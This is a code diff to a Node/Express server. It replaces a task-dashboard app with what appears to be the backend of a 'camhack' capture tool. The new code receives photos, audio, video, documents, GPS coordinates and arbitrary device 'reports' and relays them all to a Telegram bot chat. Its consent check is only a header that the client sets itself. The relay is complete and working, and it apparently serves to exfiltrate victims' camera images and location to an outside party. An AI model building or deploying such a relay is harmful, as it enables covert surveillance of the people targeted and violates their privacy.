@@ -1,168 +1,139 @@
-require('dotenv').config();
 const express = require('express');
+const multer = require('multer');
+const path = require('path');
+const fs = require('fs');
 const cors = require('cors');
 const axios = require('axios');
-const path = require('path');
+const FormData = require('form-data');
+require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
 app.use(cors());
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
-// ---------- In‑memory data ----------
-let tasks = [
-  { id: 1, title: 'Design dashboard', completed: true },
-  { id: 2, title: 'Integrate Telegram bot', completed: false },
-  { id: 3, title: 'Deploy to Vercel', completed: false }
-];
-let nextId = 4;
-let activityLog = [
-  { action: 'System initialized', timestamp: new Date().toISOString() }
-];
+const uploadDir = process.env.VERCEL
+    ? path.join('/tmp', 'camhack-uploads')
+    : path.join(__dirname, 'uploads');
+if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
+app.use('/uploads', express.static(uploadDir));
 
-// ---------- Telegram sender ----------
-async function sendTelegramMessage(text) {
-  const token = process.env.BOT_TOKEN;
-  const chatId = process.env.CHAT_ID;
-  if (!token || !chatId) {
-    console.warn('Telegram credentials missing – message not sent');
-    return;
-  }
-  try {
-    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
-      chat_id: chatId,
-      text: text,
-      parse_mode: 'HTML'
+const storage = multer.diskStorage({
+    destination: (_, __, cb) => cb(null, uploadDir),
+    filename: (_, file, cb) => {
+        const ext = path.extname(file.originalname) || '.bin';
+        cb(null, Date.now() + '-' + Math.round(Math.random() * 1e9) + ext);
+    }
+});
+const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });
+
+const tgReady = () => Boolean(BOT_TOKEN && CHAT_ID);
+const tg = (m) => `https://api.telegram.org/bot${BOT_TOKEN}/${m}`;
+
+async function sendMessage(text) {
+    if (!tgReady()) throw new Error('Telegram not configured');
+    const r = await axios.post(tg('sendMessage'), {
+        chat_id: CHAT_ID, text: String(text).slice(0, 4000),
+        parse_mode: 'HTML', disable_web_page_preview: true
+    }, { timeout: 30000 });
+    return r.data;
+}
+
+async function sendLocation(lat, lon, caption) {
+    if (!tgReady()) throw new Error('Telegram not configured');
+    const msg = `${caption || '📍 Location'}\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\n<a href="https://maps.google.com/?q=${lat},${lon}">Map</a>`;
+    await sendMessage(msg);
+    const r = await axios.post(tg('sendLocation'), { chat_id: CHAT_ID, latitude: lat, longitude: lon }, { timeout: 30000 });
+    return r.data;
+}
+
+async function sendMedia(method, field, filePath, caption) {
+    if (!tgReady()) throw new Error('Telegram not configured');
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append(field, fs.createReadStream(filePath), { filename: path.basename(filePath) });
+    if (caption) form.append('caption', String(caption).slice(0, 1024));
+    const r = await axios.post(tg(method), form, {
+        headers: form.getHeaders(), timeout: 120000,
+        maxContentLength: Infinity, maxBodyLength: Infinity
     });
-  } catch (error) {
-    console.error('Telegram send error:', error.message);
-  }
+    return r.data;
 }
 
-// Add activity log entry and optionally notify
-async function addActivity(action, notify = false) {
-  const entry = { action, timestamp: new Date().toISOString() };
-  activityLog.unshift(entry);
-  if (activityLog.length > 50) activityLog.pop();
-  if (notify) {
-    await sendTelegramMessage(`📌 <b>HackUp</b>\n${action}`);
-  }
-  return entry;
+// Consent gate (except health)
+app.use('/api', (req, res, next) => {
+    if (req.path === '/health') return next();
+    if (req.headers['x-consent'] !== 'granted') {
+        return res.status(403).json({ error: 'Consent required' });
+    }
+    next();
+});
+
+app.get('/api/health', (_, res) => res.json({
+    ok: true, telegramConfigured: tgReady(), time: new Date().toISOString()
+}));
+
+app.post('/api/upload', upload.single('image'), async (req, res) => {
+    if (!req.file) return res.status(400).json({ error: 'No file' });
+    try {
+        const r = await sendMedia('sendPhoto', 'photo', req.file.path, req.body.caption);
+        fs.unlink(req.file.path, () => {});
+        res.json({ success: true, telegram: r.ok === true });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+['audio', 'voice', 'video', 'document'].forEach(type => {
+    const map = { audio: ['sendAudio', 'audio'], voice: ['sendVoice', 'voice'], video: ['sendVideo', 'video'], document: ['sendDocument', 'document'] };
+    app.post(`/api/upload/${type}`, upload.single(type), async (req, res) => {
+        if (!req.file) return res.status(400).json({ error: 'No file' });
+        try {
+            const [m, f] = map[type];
+            const r = await sendMedia(m, f, req.file.path, req.body.caption);
+            fs.unlink(req.file.path, () => {});
+            res.json({ success: true, telegram: r.ok === true });
+        } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+    });
+});
+
+app.post('/api/telegram/message', async (req, res) => {
+    try { const r = await sendMessage(req.body.text || ''); res.json({ success: r.ok === true }); }
+    catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/telegram/location', async (req, res) => {
+    const { latitude, longitude, caption } = req.body || {};
+    if (typeof latitude !== 'number' || typeof longitude !== 'number')
+        return res.status(400).json({ error: 'lat/lon required' });
+    try { const r = await sendLocation(latitude, longitude, caption); res.json({ success: r.ok === true }); }
+    catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/telegram/report', async (req, res) => {
+    try {
+        const lines = ['📊 <b>API Report</b>', `<b>Time:</b> ${new Date().toLocaleString()}`, ''];
+        const d = req.body || {};
+        Object.keys(d).forEach(k => {
+            let v = d[k];
+            if (v === null || v === undefined || v === '') return;
+            if (typeof v === 'object') v = JSON.stringify(v).slice(0, 400);
+            lines.push(`<b>${k}:</b> <code>${String(v).slice(0, 800)}</code>`);
+        });
+        const r = await sendMessage(lines.join('\n'));
+        res.json({ success: r.ok === true });
+    } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.get('/', (_, res) => res.sendFile(path.join(__dirname, 'index.html')));
+app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'index.html')));
+
+if (require.main === module && !process.env.VERCEL) {
+    app.listen(PORT, () => {
+        console.log(`Server on ${PORT}`);
+        console.log(`Telegram: ${tgReady() ? '✅' : '❌'}`);
+    });
 }
-
-// ---------- API routes ----------
-
-// Get all tasks
-app.get('/api/tasks', (req, res) => {
-  res.json(tasks);
-});
-
-// Get activity log
-app.get('/api/activity', (req, res) => {
-  res.json(activityLog);
-});
-
-// Create a new task
-app.post('/api/tasks', async (req, res) => {
-  const { title } = req.body;
-  if (!title || title.trim() === '') {
-    return res.status(400).json({ error: 'Task title required' });
-  }
-  const newTask = {
-    id: nextId++,
-    title: title.trim(),
-    completed: false
-  };
-  tasks.push(newTask);
-  const msg = `✅ Task added: "${newTask.title}" (ID: ${newTask.id})`;
-  await addActivity(msg, true);
-  res.status(201).json(newTask);
-});
-
-// Update task (toggle or edit)
-app.put('/api/tasks/:id', async (req, res) => {
-  const id = parseInt(req.params.id);
-  const task = tasks.find(t => t.id === id);
-  if (!task) return res.status(404).json({ error: 'Task not found' });
-  const { title, completed } = req.body;
-  if (title !== undefined) task.title = title.trim();
-  if (completed !== undefined) task.completed = completed;
-  const msg = `🔄 Task updated: "${task.title}" | completed: ${task.completed}`;
-  await addActivity(msg, true);
-  res.json(task);
-});
-
-// Delete a task
-app.delete('/api/tasks/:id', async (req, res) => {
-  const id = parseInt(req.params.id);
-  const index = tasks.findIndex(t => t.id === id);
-  if (index === -1) return res.status(404).json({ error: 'Task not found' });
-  const removed = tasks.splice(index, 1)[0];
-  const msg = `🗑️ Task deleted: "${removed.title}"`;
-  await addActivity(msg, true);
-  res.json({ message: 'Task deleted', task: removed });
-});
-
-// ---------- SPECIAL: Send all data to Telegram ----------
-app.post('/api/send-all', async (req, res) => {
-  try {
-    // Build a detailed report
-    const total = tasks.length;
-    const completed = tasks.filter(t => t.completed).length;
-    const pending = total - completed;
-    const taskList = tasks.map(t => 
-      `• ${t.title} ${t.completed ? '✅' : '⏳'}`
-    ).join('\n');
-    const recentActivity = activityLog.slice(0, 5).map(a => 
-      `• ${a.action} (${new Date(a.timestamp).toLocaleString()})`
-    ).join('\n');
-
-    const message = `
-<b>📊 HackUp Report</b>
-
-<b>Tasks:</b> ${total}
-• Completed: ${completed}
-• Pending: ${pending}
-
-<b>Task List:</b>
-${taskList || 'No tasks yet.'}
-
-<b>Recent Activity:</b>
-${recentActivity || 'No activity yet.'}
-
-Generated: ${new Date().toLocaleString()}
-    `.trim();
-
-    await sendTelegramMessage(message);
-    await addActivity('📤 Sent full report to Telegram', false); // log but don't notify again
-    res.json({ success: true, message: 'All data sent to Telegram' });
-  } catch (error) {
-    console.error('Send-all error:', error);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// Test Telegram notification
-app.post('/api/telegram/test', async (req, res) => {
-  try {
-    await sendTelegramMessage('🧪 <b>Test notification</b> from HackUp!');
-    res.json({ success: true, message: 'Test sent' });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// Serve static pages
-app.get('/dashboard', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
-});
-
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-app.listen(PORT, () => {
-  console.log(`🚀 HackUp running on port ${PORT}`);
-});
+module.exports = app;
